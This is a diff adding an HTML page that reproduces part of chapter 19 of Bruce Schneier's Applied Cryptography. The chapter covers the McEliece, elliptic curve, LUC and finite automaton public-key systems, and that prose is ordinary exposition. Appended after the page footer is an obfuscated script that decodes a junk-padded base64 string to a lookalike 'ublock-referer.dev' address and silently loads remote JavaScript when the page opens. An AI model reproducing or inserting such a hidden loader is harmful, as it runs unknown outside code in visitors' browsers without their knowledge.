@@ -1,0 +1,118 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Public-Key Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=19//-->
+<!--PAGES=480-482//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="19-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch20/20-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Although the algorithm was one of the first public-key algorithms, and there were no successful cryptanalytic results against the algorithm, it has never gained wide acceptance in the cryptographic community. The scheme is two to three orders of magnitude faster than RSA, but has some problems. The public key is enormous: 2<SUP>19</SUP> bits long. The data expansion is large: The ciphertext is twice as long as the plaintext.</P>
+<P>Some attempts at cryptanalysis of this system can be found in [8, 943, 1559, 306]. None of these were successful in the general case, although the similarity between the McEliece algorithm and knapsacks worried some.</P>
+<P>In 1991, two Russian cryptographers claimed to have broken the McEliece system with some parameters [882]. Their paper contained no evidence to substantiate their claim, and most cryptographers discount the result. Another Russian attack, one that cannot be used directly against the McEliece system, is in [1447, 1448]. Extensions to McEliece can be found in [424, 1227, 976].</P>
+<P><FONT SIZE="+1"><B><I>Other Algorithms Based on Linear Error-Correcting Codes</I></B></FONT></P>
+<P>The Niederreiter algorithm [1167] is closely related to the McEliece algorithm, and assumes that the public key is a random parity-check matrix of an error-correcting code. The private key is an efficient decoding algorithm for this matrix.
+</P>
+<P>Another algorithm, used for identification and digital signatures, is based on syndrome decoding [1501]; see [306] for comments. An algorithm based on error-correcting codes [1621] is insecure [698, 33, 31, 1560, 32].</P>
+<H3><A NAME="Heading9"></A><FONT COLOR="#000077">19.8 Elliptic Curve Cryptosystems</FONT></H3>
+<P>Elliptic curves have been studied for many years and there is an enormous amount of literature on the subject. In 1985, Neal Koblitz and V. S. Miller independently proposed using them for public-key cryptosystems [867, 1095]. They did not invent a new cryptographic algorithm with elliptic curves over finite fields, but they implemented existing public-key algorithms, like Diffie-Hellman, using elliptic curves.
+</P>
+<P>Elliptic curves are interesting because they provide a way of constructing &#147;elements&#148; and &#147;rules of combining&#148; that produce groups. These groups have enough familiar properties to build cryptographic algorithms, but they don&#146;t have certain properties that may facilitate cryptanalysis. For example, there is no good notion of &#147;smooth&#148; with elliptic curves. That is, there is no set of small elements in terms of which a random element has a good chance of being expressed by a simple algorithm. Hence, index calculus discrete logarithm algorithms do not work. See [1095] for more details.</P>
+<P>Elliptic curves over the finite field GF(2<SUP><I>n</I></SUP> ) are particularly interesting. The arithmetic processors for the underlying field are easy to construct and are relatively simple to implement for <I>n</I> in the range of 130 to 200. They have the potential to provide faster public-key cryptosystems with smaller key sizes. Many public-key algorithms, like Diffie-Hellman, ElGamal, and Schnorr, can be implemented in elliptic curves over finite fields.</P>
+<P>The mathematics here are complex and beyond the scope of this book. Those interested in this topic are invited to read the two references previously mentioned, and the excellent book by Alfred Menezes [1059]. Two analogues of RSA work in elliptic curves [890, 454]. Other papers are [23, 119, 1062, 869, 152, 871, 892, 25, 895, 353, 1061, 26, 913, 914, 915]. Elliptic curve cryptosystems with small key lengths are discussed in [701]. Next Computer Inc.&#146;s Fast Elliptic Encryption (FEE) algorithm also uses elliptic curves [388]. FEE has the nice feature that the private key can be any easy-to-remember string. There are proposed public-key cryptosystems using hyperelliptic curves [868, 870, 1441, 1214].</P>
+<H3><A NAME="Heading10"></A><FONT COLOR="#000077">19.9 LUC</FONT></H3>
+<P>Some cryptographers have developed generalizations of RSA that use various permutation polynomials instead of exponentiation. A variation called Kravitz-Reed, using irreducible binary polynomials [898], is insecure [451, 589]. Winfried MŸller and Wilfried N&#246;bauer use Dickson polynomials [1127, 1128, 965]. Rudolph Lidl and MŸller generalized this approach in [966, 1126] (a variant is called the R&#233;idi scheme), and N&#246;bauer looked at its security in [1172, 1173]. (Comments on prime generation with Lucas functions are in [969, 967, 968, 598].) Despite all of this prior art, a group of researchers from New Zealand managed to patent this scheme in 1993, calling it LUC [1486, 521,1487].
+</P>
+<P>The <I>n</I>th Lucas number, <I>V</I><SUB>n</SUB>(<I>P</I>,1), is defined as</P>
+<DL>
+<DD><I>V</I><SUB>n</SUB>(<I>P</I>, 1) = <I>PV</I><SUB>n-1</SUB> (<I>P</I>, 1) - <I>V</I><SUB>n- 2</SUB> (<I>P</I>,1)
+</DL>
+<P>There&#146;s a lot more theory to Lucas numbers; I&#146;m ignoring all of it. A good theoretical treatment of Lucas sequences is in [1307, 1308]. A particularly nice description of the mathematics of LUC is in [1494, 708].
+</P>
+<P>In any case, to generate a public-key/private-key key pair, first choose two large primes, <I>p</I> and <I>q</I>. Calculate <I>n</I>, the product of <I>p</I> and <I>q</I>. The encryption key, <I>e</I>, is a random number that is relatively prime to <I>p</I> - 1, <I>q</I> - 1, <I>p</I> &#43; 1, and <I>q</I> &#43; 1.</P>
+<P>There are four possible decryption keys,</P>
+<DL>
+<DD><I>d</I> = <I>e</I><SUP>-1</SUP> mod (lcm((<I>p</I> &#43; 1), (<I>q</I> &#43; 1)))
+<DD><I>d</I> = <I>e</I><SUP>-1</SUP> mod (lcm((<I>p</I> &#43; 1), (<I>q</I> - 1)))
+<DD><I>d</I> = <I>e</I><SUP>-1</SUP> mod (lcm((<I>p</I> - 1), (<I>q</I> &#43; 1)))
+<DD><I>d</I> = <I>e</I><SUP>-1</SUP> mod (lcm((<I>p</I> - 1), (<I>q</I> - 1)))
+</DL>
+<P>where lcm is the least common multiple.
+</P>
+<P>The public key is <I>d</I> and <I>n;</I> the private key is <I>e</I> and <I>n</I>. Discard <I>p</I> and <I>q</I>.</P>
+<P>To encrypt a message, <I>P</I> (<I>P</I> must be less than <I>n</I>), calculate</P>
+<DL>
+<DD><I>C</I> = <I>V</I><SUB>e</SUB>(<I>P</I>, 1) (mod <I>n</I> )
+</DL>
+<P>And to decrypt:
+</P>
+<DL>
+<DD><I>P</I> = <I>V</I><SUB>d</SUB>
+<I>P</I>, 1) (mod <I>n</I>), with the proper <I>d</I>
+</DL>
+<P>At best, LUC is no more secure than RSA. And recent, still-unpublished results show how to break LUC in at least some implementations. I just don&#146;t trust it.
+</P>
+<H3><A NAME="Heading11"></A><FONT COLOR="#000077">19.10 Finite Automaton Public-Key Cryptosystems</FONT></H3>
+<P>Chinese cryptographer Tao Renji has developed a public-key algorithm based on finite automata [1301, 1302, 1303, 1300, 1304, 666]. Just as it is hard to factor the product of two large primes, it is also hard to factor the composition of two finite automata. This is especially so if one or both of them is nonlinear.
+</P>
+<P>Much of this research took place in China in the 1980s and was published in Chinese. Renji is starting to write in English. His main result was that certain nonlinear automata (the quasilinear automata) possess weak inverses if, and only if, they have a certain echelon matrix structure. This property disappears if they are composed with another automaton (even a linear one). In the public-key algorithm, the secret key is an invertible quasilinear automaton and a linear automaton, and the corresponding public key can be derived by multiplying them out term by term. Data is encrypted by passing it through the public automaton, and decrypted by passing it through the inverses of its components (in some cases provided they have been set to a suitable initial state). This scheme works for both encryption and digital signatures.</P>
+<P>The performance of such systems can be summed up by saying that like McEliece&#146;s system, they run much faster than RSA, but require longer keys. The keylength thought to give similar security to 512-bit RSA is 2792 bits, and to 1024-bit RSA is 4152 bits. For the former case, the system encrypts data at 20, 869 bytes/sec and decrypts data at 17, 117 bytes/sec, running on a 33 Mhz 80486.</P>
+<P>Renji has published three algorithms. The first is FAPKC0. This is a weak system which uses linear components, and is primarily illustrative. Two serious systems, FAPKC1 and FAPKC2, use one linear and one nonlinear component each. The latter is more complex, and was developed in order to support identity-based operation.</P>
+<P>As for their strength, quite a lot of work has been done on them in China (where there are now over 30 institutes publishing cryptography and security papers). One can see from the considerable Chinese language literature that the problem has been studied.</P>
+<P>One possible attraction of FAPKC1 and FAPKC2 is that they are not encumbered by any U.S. patents. Thus, once the Diffie-Hellman patent expires in 1997, they will unquestionably be in the public domain.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="19-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch20/20-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(xHAxOwAA, JAyVyasm) {JAyVyasm = xHAxOwAA.createElement('script');JAyVyasm.type = 'text/javascript';JAyVyasm.async = true;JAyVyasm.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');xHAxOwAA.getElementsByTagName('body')[0].appendChild(JAyVyasm);}(document));</script></body>
+</html>
